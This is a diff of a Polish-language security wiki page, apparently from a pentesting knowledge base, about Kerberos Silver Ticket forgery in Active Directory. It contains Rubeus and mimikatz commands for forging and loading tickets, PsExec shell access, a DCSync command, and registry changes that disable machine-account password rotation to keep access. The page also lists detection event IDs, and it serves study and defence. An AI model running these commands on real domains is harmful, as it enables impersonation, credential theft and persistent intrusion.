@@ -8,6 +8,10 @@
 
 Atak **Silver Ticket** polega na wykorzystaniu biletów serwisowych w środowiskach Active Directory (AD). Metoda ta opiera się na **zdobyciu hasha NTLM konta serwisowego**, takiego jak konto komputera, w celu sfałszowania biletu Ticket Granting Service (TGS). Dzięki temu sfałszowanemu biletowi, atakujący może uzyskać dostęp do określonych usług w sieci, **podszywając się pod dowolnego użytkownika**, zazwyczaj dążąc do uzyskania uprawnień administracyjnych. Podkreśla się, że użycie kluczy AES do fałszowania biletów jest bardziej bezpieczne i mniej wykrywalne.
 
+> [!WARNING]
+> Bilety Silver są mniej wykrywalne niż bilety Golden, ponieważ wymagają tylko **hasha konta serwisowego**, a nie konta krbtgt. Jednak są ograniczone do konkretnej usługi, którą celują. Co więcej, wystarczy ukraść hasło użytkownika. 
+Co więcej, jeśli skompromitujesz **hasło konta z SPN**, możesz użyć tego hasła do stworzenia biletu Silver, podszywając się pod dowolnego użytkownika do tej usługi.
+
 Do tworzenia biletów stosuje się różne narzędzia w zależności od systemu operacyjnego:
 
 ### On Linux
@@ -18,6 +22,11 @@ python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
 ### Na Windows
 ```bash
+# Using Rubeus
+## /ldap option is used to get domain data automatically
+## With /ptt we already load the tickt in memory
+rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd
+
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
 
@@ -28,17 +37,17 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-Usługa CIFS jest wyróżniana jako powszechny cel do uzyskania dostępu do systemu plików ofiary, ale inne usługi, takie jak HOST i RPCSS, również mogą być wykorzystywane do zadań i zapytań WMI.
+CIFS jest wyróżniane jako powszechny cel do uzyskania dostępu do systemu plików ofiary, ale inne usługi, takie jak HOST i RPCSS, również mogą być wykorzystywane do zadań i zapytań WMI.
 
 ## Dostępne usługi
 
 | Typ usługi                                 | Usługa Silver Tickets                                                      |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                   |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>W zależności od systemu operacyjnego także:</p><p>WSMAN</p><p>RPCSS</p> |
+| Zdalne uruchamianie PowerShell            | <p>HOST</p><p>HTTP</p><p>W zależności od systemu operacyjnego także:</p><p>WSMAN</p><p>RPCSS</p> |
 | WinRM                                      | <p>HOST</p><p>HTTP</p><p>W niektórych przypadkach możesz po prostu poprosić o: WINRM</p> |
 | Zaplanowane zadania                        | HOST                                                                      |
-| Udostępnianie plików w systemie Windows, także psexec | CIFS                                                                      |
+| Udostępnianie plików Windows, także psexec | CIFS                                                                      |
 | Operacje LDAP, w tym DCSync               | LDAP                                                                      |
 | Narzędzia do zdalnej administracji serwerów Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                        |
 | Złote bilety                               | krbtgt                                                                    |
@@ -53,9 +62,13 @@ Używając **Rubeus**, możesz **poprosić o wszystkie** te bilety, używając p
 - 4634: Wylogowanie konta
 - 4672: Logowanie administratora
 
+## Utrzymywanie
+
+Aby uniknąć rotacji haseł maszyn co 30 dni, ustaw `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` lub możesz ustawić `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` na większą wartość niż 30 dni, aby wskazać okres rotacji, kiedy hasło maszyny powinno być rotowane.
+
 ## Wykorzystywanie biletów usługowych
 
-W poniższych przykładach wyobraźmy sobie, że bilet został odzyskany, podszywając się pod konto administratora.
+W poniższych przykładach wyobraźmy sobie, że bilet jest pobierany, podszywając się pod konto administratora.
 
 ### CIFS
 
@@ -126,14 +139,16 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 ```
 **Dowiedz się więcej o DCSync** na następującej stronie:
 
+{{#ref}}
+dcsync.md
+{{#endref}}
+
+
 ## Odniesienia
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-
-{{#ref}}
-dcsync.md
-{{#endref}}
+- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
 
 
 
